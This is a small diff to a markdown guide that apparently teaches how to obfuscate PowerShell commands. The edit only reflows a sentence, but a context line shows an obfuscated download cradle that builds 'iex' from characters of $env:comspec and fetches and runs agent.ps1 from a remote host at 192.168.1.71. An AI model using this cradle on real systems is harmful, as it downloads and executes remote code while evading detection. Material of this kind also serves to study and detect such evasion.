@@ -277,8 +277,8 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º ,15º and 25º
-characters from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.
+- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º ,15º and 25º characters
+from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.
 
       $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
